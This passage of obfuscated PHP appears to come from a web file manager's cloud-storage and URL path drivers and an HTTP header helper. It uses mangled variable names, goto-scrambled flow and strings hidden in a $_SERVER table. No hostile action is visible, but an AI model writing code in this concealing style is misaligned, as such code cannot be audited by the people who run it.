$fä‚æä¢§ = $this->fileList($e¢èïĞ¨ÅÇ, $a³ÄµÉÚ†, $B¤šÚÑ¤óæ); if (!$fä‚æä¢§) { return !1; } $a³ÄµÉÚ† = isset($fä‚æä¢§[$a„ˆ²ØçÇ[1256]]) ? $fä‚æä¢§[$a„ˆ²ØçÇ[1256]] : $a„ˆ²ØçÇ[33]; $EÒÂ¾µçÔ = isset($fä‚æä¢§[$a„ˆ²ØçÇ[1257]]) ? $fä‚æä¢§[$a„ˆ²ØçÇ[1257]] : array(); foreach ($EÒÂ¾µçÔ as $B¦—ÅÀËÛ) { $Cî¶£®·¡Õ = array($a„ˆ²ØçÇ[75] => $E­ÑÆ»¤¡ . $B¦—ÅÀËÛ[$a„ˆ²ØçÇ[28]], $a„ˆ²ØçÇ[76] => $B¦—ÅÀËÛ[$a„ˆ²ØçÇ[29]] == $a„ˆ²ØçÇ[76] ? 1 : 0, $a„ˆ²ØçÇ[77] => isset($B¦—ÅÀËÛ[$a„ˆ²ØçÇ[325]]) ? $B¦—ÅÀËÛ[$a„ˆ²ØçÇ[325]] : 0); $Aù‡”ôğé«[] = $Cî¶£®·¡Õ; if ($Cî¶£®·¡Õ[$a„ˆ²ØçÇ[76]] == 1) { $this->recursionAllFiles($Cî¶£®·¡Õ[$a„ˆ²ØçÇ[75]], $Aù‡”ôğé«); } } if (count($EÒÂ¾µçÔ) < $B¤šÚÑ¤óæ) { break; } } } public function has($dó‘‹§Ë×±, $bÛŠµöÄ ù = false, $CÒ§İÎòë© = true) { goto FœÁÕø³±„; CÆÇËµ¾Œ¼: while (!0) { $eˆ×±µÄÃß = $this->fileList($dó‘‹§Ë×±, $AÔÖŠÖ Ú, $f–ó©“Á°); if (!$eˆ×±µÄÃß) { return !1; } $AÔÖŠÖ Ú = isset($eˆ×±µÄÃß[$BÙ¤…Ãî×‘[1256]]) ? $eˆ×±µÄÃß[$BÙ¤…Ãî×‘[1256]] : $BÙ¤…Ãî×‘[33]; $d‘á«¤§½ = isset($eˆ×±µÄÃß[$BÙ¤…Ãî×‘[1257]]) ? $eˆ×±µÄÃß[$BÙ¤…Ãî×‘[1257]] : array(); if (empty($d‘á«¤§½)) { break; } $a÷ÔØÕµ‹Ï = array_to_keyvalue($d‘á«¤§½, $BÙ¤…Ãî×‘[33], $BÙ¤…Ãî×‘[29]); $AÃáµŸ¾Ñï = array_count_values($a÷ÔØÕµ‹Ï); $F°Ò¢éÅ½Ã = isset($AÃáµŸ¾Ñï[$BÙ¤…Ãî×‘[76]]) ? $AÃáµŸ¾Ñï[$BÙ¤…Ãî×‘[76]] : 0; $DØ¶Æ‘·İ‘ = count($a÷ÔØÕµ‹Ï) - $F°Ò¢éÅ½Ã; if ($bÛŠµöÄ ù) { $BŠèˆëº¾¾ += $F°Ò¢éÅ½Ã; $CøÛ³„§Û÷ += $DØ¶Æ‘·İ‘; if ($BÅÄŒ½å¦« < $f–ó©“Á°) { break; } continue; } if ($CÒ§İÎòë©) { if ($DØ¶Æ‘·İ‘) { return !0; } } else { if ($F°Ò¢éÅ½Ã) { return !0; } } if (count($d‘á«¤§½) < $f–ó©“Á°) { break; } } if ($bÛŠµöÄ ù) { return array($BÙ¤…Ãî×‘[191] => $CøÛ³„§Û÷, $BÙ¤…Ãî×‘[192] => $BŠèˆëº¾¾); } return !1; goto DèùßÓÊ§; FœÁÕø³±„: $BÙ¤…Ãî×‘ =& $_SERVER[Å¸ş]; $AÔÖŠÖ Ú = $BÙ¤…Ãî×‘[33]; $f–ó©“Á° = 1000; goto AÆÃÏ…‹§; AÆÃÏ…‹§: $CøÛ³„§Û÷ = 0; $BŠèˆëº¾¾ = 0; $fíàì¥ ¦ = rtrim($dó‘‹§Ë×±, $BÙ¤…Ãî×‘[8]) . $BÙ¤…Ãî×‘[8]; goto CÆÇËµ¾Œ¼; DèùßÓÊ§: } public function listAll($b…ÄÜµëÚ ) { $E•‹×îºº = array(); $this->recursionAllFiles($b…ÄÜµëÚ , $E•‹×îºº); return $E•‹×îºº; } public function canRead($Eñ™³áô–) { return $this->exist($Eñ™³áô–) ? !0 : !1; } public function canWrite($D†ò™™™…Ë) { return $this->exist($D†ò™™™…Ë) ? !0 : !1; } public function getContent($cÍì·èƒÌ) { return $this->fileSubstr($cÍì·èƒÌ, 0, -1); } public function setContent($bè¿æ‚ÒÅÃ, $D†Í¶Ñ°¶Ï = '') { $cÓ„›åö =& $_SERVER[Å¸ş]; if (!$D†Í¶Ñ°¶Ï) { $D¨ßÆ®ç¬Š = $this->ussRequest($bè¿æ‚ÒÅÃ, $cÓ„›åö[212]); return $D¨ßÆ®ç¬Š[$cÓ„›åö[1030]]; } $CÌÂĞ’”‘ = $this->tempFile($this->pathThis($bè¿æ‚ÒÅÃ)); file_put_contents($CÌÂĞ’”‘, $D†Í¶Ñ°¶Ï); if ($this->upload($bè¿æ‚ÒÅÃ, $CÌÂĞ’”‘)) { $this->tempFileRemve($CÌÂĞ’”‘); return !0; } return !1; } public function fileSubstr($d–À ÊÊÇ–, $A¨â—™ŒÁ, $bá“åËÈÊ¢) { $E®Â¾©‘±” =& $_SERVER[Å¸ş]; if (!($DÕÓ‹ÁĞ = $this->link($d–À ÊÊÇ–))) { return !1; } $Eô…ö‡ÇÆ = !1; if ($bá“åËÈÊ¢ > 0) { $Bõ¢‰°¢§ñ = $A¨â—™ŒÁ + $bá“åËÈÊ¢ - 1; $Eô…ö‡ÇÆ = array($E®Â¾©‘±”[1218] . $A¨â—™ŒÁ . $E®Â¾©‘±”[412] . $Bõ¢‰°¢§ñ); } $D†Ö›Ú‹Ö² = url_request($DÕÓ‹ÁĞ, $E®Â¾©‘±”[216], !1, $Eô…ö‡ÇÆ); return $D†Ö›Ú‹Ö²[$E®Â¾©‘±”[692]] ? $D†Ö›Ú‹Ö²[$E®Â¾©‘±”[1032]] : !1; } public function upload($Fº©æ¢ù±, $a•¼–¾ëø‹, $a”·ÈĞé‰ = false, $AÆ¯ÎÜáèï = REPEAT_REPLACE) { goto dŒ¥öøø‹; A¯Îî„”Á…: $DÅ¹ù“à’ = 1024 * 1024 * 10; $FÅ„„†¹Ö = array($cô¿ëÈïÒğ[1259], $cô¿ëÈïÒğ[1260] . $bŠí³•İÅ­, $cô¿ëÈïÒğ[1261], $cô¿ëÈïÒğ[1262] . $DÅ¹ù“à’); $D“ÆŸíŞÃ· = $this->ussRequest($Fº©æ¢ù±, $cô¿ëÈïÒğ[214], !1, $FÅ„„†¹Ö); goto C·å‰˜©È…; BÆÛ©¬·¥º: $D“ÆŸíŞÃ· = $this->ussRequest($Fº©æ¢ù±, $cô¿ëÈïÒğ[214], !1, $FÅ„„†¹Ö); return $D“ÆŸíŞÃ·[$cô¿ëÈïÒğ[1030]] ? $this->getPathOuter($f½‰º½Ô·İ) : !1; goto c‡Æ…‚; C·å‰˜©È…: if (!$D“ÆŸíŞÃ·[$cô¿ëÈïÒğ[1030]]) { return !1; } $C´ÛÁË“ = $D“ÆŸíŞÃ·[$cô¿ëÈïÒğ[1032]]; $a‰â¥ì©äö = 0; goto Açˆ„à; dŒ¥öøø‹: $cô¿ëÈïÒğ =& $_SERVER[Å¸ş]; $bŠí³•İÅ­ = IO::size($a•¼–¾ëø‹); if ($bŠí³•İÅ­ <= 1024 * 1024 * 200) { $F×ôè„äº = array($cô¿ëÈïÒğ[1258] . $a•¼–¾ëø‹); $D“ÆŸíŞÃ· = $this->ussRequest($Fº©æ¢ù±, $cô¿ëÈïÒğ[214], $F×ôè„äº); return $D“ÆŸíŞÃ·[$cô¿ëÈïÒğ[1030]] ? $this->getPathOuter($Fº©æ¢ù±) : !1; } goto A¯Îî„”Á…; e‡‹•ŒŠ‘¼: do { $b˜ÔÉŒ‰š = $C´ÛÁË“[$cô¿ëÈïÒğ[1264]]; fseek($aÅàáÅœ²£, $a‰â¥ì©äö); $Cñóì•‰ïˆ = fread($aÅàáÅœ²£, $b˜ÔÉŒ‰š); $eÇàçÓÖ†“ = 0; do { $eÇàçÓÖ†“++; $C´ÛÁË“ = $this->uploadPart($Fº©æ¢ù±, $C´ÛÁË“, $Cñóì•‰ïˆ); } while (!$C´ÛÁË“ && $eÇàçÓÖ†“ < 3); if (!$C´ÛÁË“) { return !1; } $d¡ŞİÙßÆğ = $C´ÛÁË“[$cô¿ëÈïÒğ[1263]]; $a‰â¥ì©äö += $b˜ÔÉŒ‰š; } while ($d¡ŞİÙßÆğ != -1); fclose($aÅàáÅœ²£); $FÅ„„†¹Ö = array($cô¿ëÈïÒğ[1265], $cô¿ëÈïÒğ[1266] . $C´ÛÁË“[$cô¿ëÈïÒğ[1267]], $cô¿ëÈïÒğ[1261]); goto BÆÛ©¬·¥º; Açˆ„à: $d¡ŞİÙßÆğ = $C´ÛÁË“[$cô¿ëÈïÒğ[1263]]; $aÅàáÅœ²£ = fopen($a•¼–¾ëø‹, $cô¿ëÈïÒğ[1168]); if (!$aÅàáÅœ²£) { return !1; } goto e‡‹•ŒŠ‘¼; c‡Æ…‚: } private function uploadPart($F•á¬­„…, $DßŞùåß÷«, &$BØƒæÉÛ‹) { $BëÑ¤é¦¶ =& $_SERVER[Å¸ş]; $Dã–ÒñõÀ“ = array($BëÑ¤é¦¶[1268], $BëÑ¤é¦¶[1266] . $DßŞùåß÷«[$BëÑ¤é¦¶[1267]], $BëÑ¤é¦¶[1269] . $DßŞùåß÷«[$BëÑ¤é¦¶[1263]], $BëÑ¤é¦¶[138] . $DßŞùåß÷«[$BëÑ¤é¦¶[1264]]); $E¡šâã¬à = $this->ussRequest($F•á¬­„…, $BëÑ¤é¦¶[214], $BØƒæÉÛ‹, $Dã–ÒñõÀ“); return !$E¡šâã¬à[$BëÑ¤é¦¶[1030]] ? $E¡šâã¬à[$BëÑ¤é¦¶[1030]] : $E¡šâã¬à[$BëÑ¤é¦¶[1032]]; } public function uploadFormData($fÁï‘ˆŒõø, $Aå´£Î¥„ò = 3600) { return $this->uploadPolicy($fÁï‘ˆŒõø, $Aå´£Î¥„ò); } public function multiUploadFormData($Aãä˜°ì¨, $fßİĞ£ÌÃˆ = 3600) { $d†¾‚Ûƒ’Ï =& $_SERVER[Å¸ş]; $dµÊšÉùƒÖ = (int) $GLOBALS[$d†¾‚Ûƒ’Ï[7]][$d†¾‚Ûƒ’Ï[77]]; return $this->uploadPolicy($Aãä˜°ì¨, $fßİĞ£ÌÃˆ, $dµÊšÉùƒÖ); } private function uploadPolicy($DÎó˜‘²Ó¤, $fİÀØªâÈ = 3600, $bœ—Îêœ¦á = 0) { goto fªö¥†ïæå; A¯•§Ò­Î: $cîÅª‹™ = array($DÛè„Èƒ±[1270] => $this->bucket, $DÛè„Èƒ±[1271] => $DÎó˜‘²Ó¤, $DÛè„Èƒ±[1272] => time() + $fİÀØªâÈ, $DÛè„Èƒ±[1273] => $FåÏÁ­ÙÃ); if ($bœ—Îêœ¦á) { $cîÅª‹™[$DÛè„Èƒ±[1189]] = $bœ—Îêœ¦á; } $DÓ‚óÍ„ = base64_encode(json_encode($cîÅª‹™)); goto BĞ«†½Éá¤; fªö¥†ïæå: $DÛè„Èƒ± =& $_SERVER[Å¸ş]; $EäÚ¡·ğ™ = $DÛè„Èƒ±[8] . $this->bucket; $FåÏÁ­ÙÃ = gmdate($DÛè„Èƒ±[1203]); goto A¯•§Ò­Î; BĞ«†½Éá¤: $BÛ´¢’ê¸ = base64_encode(hash_hmac($DÛè„Èƒ±[1240], "\x50\x4f\x53\124\46{$EäÚ¡·ğ™}\x26{$FåÏÁ­ÙÃ}\46{$DÓ‚óÍ„}", md5("{$this->userpass}"), !0)); $eÄØÒí‘¨Ø = array($DÛè„Èƒ±[1110] => $DÓ‚óÍ„, $DÛè„Èƒ±[1274] => "\125\x50\131\125\x4e\40{$this->username}\72{$BÛ´¢’ê¸}", $DÛè„Èƒ±[169] => $this->endpoint . $EäÚ¡·ğ™); return $eÄØÒí‘¨Ø; goto Döšë¼¦ô; Döšë¼¦ô: } public function download($e²¸‹øî§ä, $AÚ‚¹ƒ±é) { goto EÈˆ‡ºßœ×; e£å²­¶ø¤: fclose($Bã¾‚õÒƒ¬); return $AÚ‚¹ƒ±é; goto F‡ª¨ì¸’ï; E¥ŞóÌ‹îÀ: $EùøÆ‰ÁÈ = 1024 * 200; $Bã¾‚õÒƒ¬ = fopen($a®»ÔÆÑ×, $_SERVER[Å¸ş][1224]); while (!0) { $e§ì×â§«Ö = $this->fileSubstr($e²¸‹øî§ä, $E‘İÌ‰, $EùøÆ‰ÁÈ); if ($e§ì×â§«Ö === !1) { return !1; } fwrite($Bã¾‚õÒƒ¬, $e§ì×â§«Ö); $E‘İÌ‰ += $EùøÆ‰ÁÈ; if (strlen($e§ì×â§«Ö) < $EùøÆ‰ÁÈ) { break; } } goto e£å²­¶ø¤; EÈˆ‡ºßœ×: $a®»ÔÆÑ× = IO::getPathInner(IO::mkfile($AÚ‚¹ƒ±é)); if (!($cù³³§¦–Ó = $this->link($e²¸‹øî§ä))) { return !1; } $E‘İÌ‰ = 0; goto E¥ŞóÌ‹îÀ; F‡ª¨ì¸’ï: } public function link($BĞê»ÙàÅ¹, $aÙ•×Ä‘¥· = array()) { $Dëøœµ˜°¡ =& $_SERVER[Å¸ş]; $BĞê»ÙàÅ¹ = trim($BĞê»ÙàÅ¹, $Dëøœµ˜°¡[8]); if (!empty($this->token)) { $F•“²·ãí = strtotime(date($Dëøœµ˜°¡[1275])); $d”‹¿ñ¨Éˆ = substr(md5($this->token . $Dëøœµ˜°¡[272] . $F•“²·ãí . $Dëøœµ˜°¡[1276] . $BĞê»ÙàÅ¹), 12, 8) . $F•“²·ãí; $aÙ•×Ä‘¥·[] = $Dëøœµ˜°¡[1277] . $d”‹¿ñ¨Éˆ; } $c«øÔÊÔÂ± = !empty($aÙ•×Ä‘¥·) ? $Dëøœµ˜°¡[69] . implode($Dëøœµ˜°¡[272], $aÙ•×Ä‘¥·) : $Dëøœµ˜°¡[33]; return $this->getHost() . $Dëøœµ˜°¡[8] . $BĞê»ÙàÅ¹ . $c«øÔÊÔÂ±; } public function fileOut($f”ëø™¯¹, $E¢Ì¼‰è‹Î = false, $EÛ–ÄŒê = false, $aÛŞ°ˆá®è = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($f”ëø™¯¹, $E¢Ì¼‰è‹Î, $EÛ–ÄŒê, $aÛŞ°ˆá®è); } if (!$EÛ–ÄŒê) { $EÛ–ÄŒê = $this->pathThis($f”ëø™¯¹); } $f²ÎÄÆÇäÛ = $E¢Ì¼‰è‹Î ? array($_SERVER[Å¸ş][1278] . rawurlencode($EÛ–ÄŒê)) : array(); $døôš Íó¾ = $this->link($f”ëø™¯¹, $f²ÎÄÆÇäÛ); $this->fileOutLink($døôš Íó¾); } public function fileOutServer($A‡°ĞÒ˜¸, $A¥¸‘šà® = false, $C‹‘ÅŒ«ã = false, $bŸëæ ¶°Ê = '') { parent::fileOut($A‡°ĞÒ˜¸, $A¥¸‘šà®, $C‹‘ÅŒ«ã, $bŸëæ ¶°Ê); } public function fileOutImage($dªí÷ç¡êõ, $Aåš”Üç = 250) { $D™±ŞËƒÙ = $this->link($dªí÷ç¡êõ . $_SERVER[Å¸ş][1279] . $Aåš”Üç); $this->fileOutLink($D™±ŞËƒÙ); } public function fileOutImageServer($DİËï’°ŠÔ, $eÒ£§¨•Ä¥ = 250) { parent::fileOutImage($DİËï’°ŠÔ, $eÒ£§¨•Ä¥); } public function hashMd5($e“™‚ŠÍÀÊ) { $d ‰İƒ„ĞŒ =& $_SERVER[Å¸ş]; $câ“°¬š…é = $this->objectMeta($e“™‚ŠÍÀÊ); return isset($câ“°¬š…é[$d ‰İƒ„ĞŒ[196]]) ? $câ“°¬š…é[$d ‰İƒ„ĞŒ[196]] : !1; } public function size($AË½¡è¢Ë) { $Cœ¼‚’ÀŒÉ = $this->objectMeta($AË½¡è¢Ë); return $Cœ¼‚’ÀŒÉ ? $Cœ¼‚’ÀŒÉ[$_SERVER[Å¸ş][77]] : 0; } public function info($a¯âµŸ’·‚) { if ($this->isFolder($a¯âµŸ’·‚)) { return $this->folderInfo($a¯âµŸ’·‚); } else { if ($this->isFile($a¯âµŸ’·‚)) { return $this->fileInfo($a¯âµŸ’·‚); } } return !1; } public function exist($fÁ›¹É°‹É) { return $this->isFile($fÁ›¹É°‹É) || $this->isFolder($fÁ›¹É°‹É); } public function isFile($A×Ç»íÓ×§) { return !$this->isFolder($A×Ç»íÓ×§) && $this->objectMeta($A×Ç»íÓ×§); } public function isFolder($CÌëÊğñàŞ) { return $this->cacheMethod($_SERVER[Å¸ş][223], $CÌëÊğñàŞ); } protected function objectMeta($E°òˆ½‚«Ã) { return $this->cacheMethod($_SERVER[Å¸ş][224], $E°òˆ½‚«Ã); } protected function _objectMeta($e½œ»¬¬Á‡) { goto Få¶ ÁÜªÏ; Få¶ ÁÜªÏ: $D×½ìªµ¿é =& $_SERVER[Å¸ş]; if ($e½œ»¬¬Á‡ == $D×½ìªµ¿é[33] || $e½œ»¬¬Á‡ == $D×½ìªµ¿é[8]) { return array(); } $e°Ÿ“­ô¡ = $this->ussRequest($e½œ»¬¬Á‡, $D×½ìªµ¿é[1280]); goto c‹¥îŒå»ó; c‹¥îŒå»ó: if (!$e°Ÿ“­ô¡[$D×½ìªµ¿é[1030]]) { return null; } $c£Òä˜ø­Ó = isset($e°Ÿ“­ô¡[$D×½ìªµ¿é[1032]]) ? $e°Ÿ“­ô¡[$D×½ìªµ¿é[1032]] : array(); if (!isset($c£Òä˜ø­Ó[$D×½ìªµ¿é[1281]])) { return null; } goto a…œÑöçˆÕ; a…œÑöçˆÕ: $dÒêåÎ††² = array($D×½ìªµ¿é[28] => get_path_this($e½œ»¬¬Á‡), $D×½ìªµ¿é[29] => isset($c£Òä˜ø­Ó[$D×½ìªµ¿é[1281]]) ? $c£Òä˜ø­Ó[$D×½ìªµ¿é[1281]] : null, $D×½ìªµ¿é[77] => isset($c£Òä˜ø­Ó[$D×½ìªµ¿é[1282]]) ? $c£Òä˜ø­Ó[$D×½ìªµ¿é[1282]] : null, $D×½ìªµ¿é[196] => isset($c£Òä˜ø­Ó[$D×½ìªµ¿é[1283]]) ? $c£Òä˜ø­Ó[$D×½ìªµ¿é[1283]] : null, $D×½ìªµ¿é[1251] => isset($c£Òä˜ø­Ó[$D×½ìªµ¿é[1284]]) ? $c£Òä˜ø­Ó[$D×½ìªµ¿é[1284]] : null); $dÒêåÎ††²[$D×½ìªµ¿é[1252]] = isset($c£Òä˜ø­Ó[$D×½ìªµ¿é[1285]]) ? strtotime($c£Òä˜ø­Ó[$D×½ìªµ¿é[1285]]) : $dÒêåÎ††²[$D×½ìªµ¿é[1251]]; return $dÒêåÎ††²; goto FŞë¤äˆœ¾; FŞë¤äˆœ¾: } protected function _isFolder($Aåßµæ– Š) { $AÊØµ¡À =& $_SERVER[Å¸ş]; if ($Aåßµæ– Š == $AÊØµ¡À[33] || $Aåßµæ– Š == $AÊØµ¡À[8]) { return !0; } $FƒæÚ…Á® = $this->objectMeta($Aåßµæ– Š); return isset($FƒæÚ…Á®[$AÊØµ¡À[29]]) && $FƒæÚ…Á®[$AÊØµ¡À[29]] == $AÊØµ¡À[76] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($dõê„‚î¿¾ = false) { } public function exist($C­œ…Ñôá°) { $C±ù¢·Ÿœ‘ = $this->info($C­œ…Ñôá°); return $C±ù¢·Ÿœ‘[$_SERVER[Å¸ş][188]]; } public function isFile($CŸØ¹ÄâÏ) { $f³¼‚Şá“ç = $this->info($CŸØ¹ÄâÏ); return $f³¼‚Şá“ç[$_SERVER[Å¸ş][188]]; } public function isFolder($D•ˆ´‘Ì¾) { return !1; } public function size($Eî©Ô·Èó·) { $AÂŒ‰­º–™ = $this->info($Eî©Ô·Èó·); return $AÂŒ‰­º–™[$_SERVER[Å¸ş][77]]; } public function info($D¶ğïƒõ³) { return $this->infoParse($D¶ğïƒõ³); } public function infoAuth($EÉ—Ææ¬Şë) { return $this->infoParse($EÉ—Ææ¬Şë); } public function infoWithChildren($F³›áØ„ÕÛ) { return $this->infoParse($F³›áØ„ÕÛ); } public function infoFull($cøÚššÕ³ä) { return $this->infoParse($cøÚššÕ³ä); } private function infoParse($CçĞ ‹¸£’) { $BÊ —òçŞ¬ =& $_SERVER[Å¸ş]; $CÕÔ«„¦ÑÜ = $this->header($CçĞ ‹¸£’); if (!$CÕÔ«„¦ÑÜ || !$CÕÔ«„¦ÑÜ[$BÊ —òçŞ¬[692]]) { return !1; } $aâ‡†¾±×º = _get($CÕÔ«„¦ÑÜ, $BÊ —òçŞ¬[325], 0); $AÇ¯ÅÏ‡‘ = array($BÊ —òçŞ¬[28] => $CÕÔ«„¦ÑÜ[$BÊ —òçŞ¬[28]], $BÊ —òçŞ¬[75] => $CçĞ ‹¸£’, $BÊ —òçŞ¬[29] => $BÊ —òçŞ¬[167], $BÊ —òçŞ¬[77] => intval($aâ‡†¾±×º), $BÊ —òçŞ¬[160] => get_path_ext($CÕÔ«„¦ÑÜ[$BÊ —òçŞ¬[28]]), $BÊ —òçŞ¬[1160] => $aâ‡†¾±×º > 0 && $CÕÔ«„¦ÑÜ[$BÊ —òçŞ¬[1286]], $BÊ —òçŞ¬[1161] => !1); return $AÇ¯ÅÏ‡‘; } private function header($e™Ú¶ÂñÖÛ) { if (isset(self::$_cacheHeader[$e™Ú¶ÂñÖÛ])) { return self::$_cacheHeader[$e™Ú¶ÂñÖÛ]; } self::$_cacheHeader[$e™Ú¶ÂñÖÛ] = url_header($e™Ú¶ÂñÖÛ); return self::$_cacheHeader[$e™Ú¶ÂñÖÛ]; } public function hashSimple($fè”¯ìÒ, $E”Øˆ¶‘ = false) { goto Cå•ÅÜÀ µ; F£Ëå‡Á: $bƒ»„ÃëÉ¾ = timeFloat(); $FÕÛÛ»ãÆÂ = 15; for ($BŠÓ‰ã÷µ  = 0; $BŠÓ‰ã÷µ  < $eÒàÌ”ùí; $BŠÓ‰ã÷µ ++) { if (timeFloat() - $bƒ»„ÃëÉ¾ > $FÕÛÛ»ãÆÂ) { return !1; } $aƒëš •œ = $this->fileSubstr($fè”¯ìÒ, $E˜âõóœ“ * $BŠÓ‰ã÷µ , $AË¿İ†éµ); if (!$aƒëš •œ) { return !1; } $dÏ‘Î šœí .= $aƒëš •œ; } goto aÙ×ñºÚ¥; aÙ×ñºÚ¥: $dÏ‘Î šœí .= $this->fileSubstr($fè”¯ìÒ, $Cñ©”©ùÈÈ - $AË¿İ†éµ, $AË¿İ†éµ); return md5($dÏ‘Î šœí) . $Cñ©”©ùÈÈ; goto d–ŞÇ¤Ü‚; Cå•ÅÜÀ µ: $CÈ¯æˆïÜ =& $_SERVER[Å¸ş]; $eˆÖ¯¦½×¬ = $this->info($fè”¯ìÒ); if (!$eˆÖ¯¦½×¬ || !$eˆÖ¯¦½×¬[$CÈ¯æˆïÜ[188]]) { return !1; } goto DóØİ—ê¿…; cÔ¶–¯”‘: if ($Cñ©”©ùÈÈ <= $AË¿İ†éµ * $eÒàÌ”ùí) { return md5($this->fileSubstr($fè”¯ìÒ, 0, $Cñ©”©ùÈÈ)) . $Cñ©”©ùÈÈ; } $E˜âõóœ“ = intval($Cñ©”©ùÈÈ / $eÒàÌ”ùí); $dÏ‘Î šœí = $CÈ¯æˆïÜ[33]; goto F£Ëå‡Á; DóØİ—ê¿…: $Cñ©”©ùÈÈ = $eˆÖ¯¦½×¬[$CÈ¯æˆïÜ[77]]; $AË¿İ†éµ = 200; $eÒàÌ”ùí = 50; goto cÔ¶–¯”‘; d–ŞÇ¤Ü‚: } public function getContent($b¥øŠôÊšÇ) { return $this->fileSubstr($b¥øŠôÊšÇ); } public function fileSubstr($cÏ‘¢å«, $EµçÆóÛ©ì = 0, $BÇç¡Şì÷” = -1) { goto A–¿±áÇ¦…; A–¿±áÇ¦…: $C–ƒ›‘Âß =& $_SERVER[Å¸ş]; $BÌÒ êÜ‰Ú = $this->info($cÏ‘¢å«); if (!$BÌÒ êÜ‰Ú || !$BÌÒ êÜ‰Ú[$C–ƒ›‘Âß[188]] && $BÌÒ êÜ‰Ú[$C–ƒ›‘Âß[77]] > 1024 * 1024 * 10) { return !1; } goto AÊ£ĞË¨ŠØ; báÊ„Ç’×: $F†³¬†¨¸ = url_request($cÏ‘¢å«, $C–ƒ›‘Âß[216], !1, $b‹Ô¾—°£, !1, !1, 1); return $F†³¬†¨¸[$C–ƒ›‘Âß[1032]] ? $F†³¬†¨¸[$C–ƒ›‘Âß[1032]] : $C–ƒ›‘Âß[33]; goto CÜğ¾Óï²–; AÊ£ĞË¨ŠØ: if ($BÇç¡Şì÷” === -1) { $BÇç¡Şì÷” = $BÌÒ êÜ‰Ú[$C–ƒ›‘Âß[77]]; } if ($BÇç¡Şì÷” == 0) { return $C–ƒ›‘Âß[33]; } $b‹Ô¾—°£ = array($C–ƒ›‘Âß[1287] . $EµçÆóÛ©ì . $C–ƒ›‘Âß[718] . ($EµçÆóÛ©ì + $BÇç¡Şì÷” - 1)); goto báÊ„Ç’×; CÜğ¾Óï²–: } public function download($A·ÔƒÑ½˜Ø, $DÖ–¦¢¤™¿) { Downloader::start($A·ÔƒÑ½˜Ø, $DÖ–¦¢¤™¿); return $DÖ–¦¢¤™¿; } } goto A½°‘Åí‘; E¨¬“Ù½º£: class HttpHeader { public static $_headers = array("\x48\x6f\163\164" => "\x48\124\x54\x50\x5f\x48\x4f\123\x54", "\125\x73\145\x72\55\101\147\145\x6e\164" => "\x48\x54\124\120\x5f\x55\x53\105\122\x5f\101\107\x45\x4e\124", "\x43\157\x6e\x74\x65\x6e\x74\55\x54\171\160\x65" => "\x48\124\x54\120\137\103\117\116\124\x45\x4e\x54\x5f\124\131\x50\x45", "\x43\x6f\x6e\x74\145\156\164\x2d\x4c\145\156\x67\164\x68" => "\110\124\x54\x50\137\103\x4f\x4e\124\105\x4e\124\x5f\x4c\x45\x4e\x47\124\110", "\104\145\x70\164\150" => "\x48\124\124\120\x5f\104\x45\x50\124\x48", "\105\170\x70\145\x63\x74" => "\x48\124\x54\x50\137\x45\x58\x50\105\x43\124", "\x49\146\55\x4e\x6f\156\x65\55\x4d\141\x74\143\x68" => "\x48\x54\x54\120\x5f\x49\x46\137\x4e\x4f\x4e\105\x5f\115\101\124\x43\110", "\111\146\x2d\x4d\x61\x74\x63\150" => "\110\x54\124\x50\137\x49\106\137\x4d\x41\x54\x43\110", "\x49\146\55\x52\141\x6e\147\145" => "\x48\x54\x54\x50\x5f\x49\106\x5f\122\101\x4e\107\105", "\114\141\x73\164\55\115\x6f\144\x69\x66\x69\x65\144" => "\x48\124\124\x50\x5f\x4c\x41\x53\x54\137\x4d\x4f\x44\x49\106\111\105\x44", "\x49\146\x2d\115\x6f\x64\151\x66\x69\145\x64\55\123\151\156\143\145" => "\x48\x54\x54\120\137\x49\x46\x5f\x4d\x4f\104\111\x46\111\x45\x44\x5f\x53\x49\116\103\x45", "\x49\x66\x2d\x55\x6e\x6d\157\x64\x69\x66\x69\145\144\x2d\x53\151\156\x63\x65" => "\110\124\x54\120\137\x49\106\x5f\125\116\115\x4f\x44\x49\x46\x49\105\104\x5f\123\111\116\103\x45", "\122\x61\156\x67\x65" => "\x48\124\124\x50\137\122\x41\x4e\x47\105", "\124\x69\155\x65\157\x75\x74" => "\110\x54\124\120\x5f\124\x49\x4d\105\117\125\124", "\x49\x66" => "\110\124\124\x50\137\x49\x46", "\114\x6f\143\x6b\x2d\x54\x6f\x6b\145\156" => "\110\x54\x54\120\x5f\114\117\103\x4b\137\x54\x4f\x4b\x45\116", "\x4f\166\x65\162\x77\162\151\x74\145" => "\110\x54\x54\120\x5f\117\x56\105\x52\x57\122\111\124\105", "\104\145\163\164\x69\x6e\141\164\151\157\x6e" => "\x48\x54\x54\x50\137\104\105\123\x54\x49\116\101\124\x49\x4f\116", "\x52\145\x71\x75\145\x73\x74\x2d\111\144" => "\122\105\121\x55\x45\123\x54\x5f\x49\104", "\x52\145\x71\x75\x65\x73\164\55\x42\x6f\144\171\x2d\106\x69\x6c\x65" => "\x52\105\121\125\x45\x53\124\x5f\x42\x4f\104\x59\137\x46\111\x4c\105", "\122\145\144\x69\162\x65\143\164\x2d\x53\x74\x61\x74\x75\x73" => "\122\105\104\111\x52\x45\x43\x54\x5f\123\124\x41\124\x55\123"); public static function init() { static $Aƒ²½ìâ©Æ = false; if ($Aƒ²½ìâ©Æ) { return; } foreach ($_SERVER as $bœªêá”­ => $EÀëÖÙĞ‰ó) { $bœªêá”­ = strtoupper($bœªêá”­); if (!array_key_exists($bœªêá”­, $_SERVER)) { continue; } $_SERVER[$bœªêá”­] = $EÀëÖÙĞ‰ó; } foreach (self::$_headers as $bœªêá”­ => $e±ŸĞ—Š“„) { if (!array_key_exists($bœªêá”­, $_SERVER)) { continue; } $_SERVER[$bœªêá”­] = $_SERVER[$e±ŸĞ—Š“„]; $_SERVER[strtoupper($bœªêá”­)] = $_SERVER[$e±ŸĞ—Š“„]; } } public static function get($A¢áŠçÍ‡è) { self::init(); return $_SERVER[$A¢áŠçÍ‡è] ? $_SERVER[$A¢áŠçÍ‡è] : $_SERVER[$_SERVER[Å¸ş][1830] . strtoupper($A¢áŠçÍ‡è)]; } public static function method() { return strtoupper(self::get($_SERVER[Å¸ş][154])); } public static function length() { $a”‘İß†±ø =& $_SERVER[Å¸ş]; $A¾»Ò¦ÓÜ = self::get($a”‘İß†±ø[1831]); if (!$A¾»Ò¦ÓÜ) { $A¾»Ò¦ÓÜ = self::get($a”‘İß†±ø[1144]); } return $A¾»Ò¦ÓÜ; } public static function range() { $B„ÇíõÔÀÅ =& 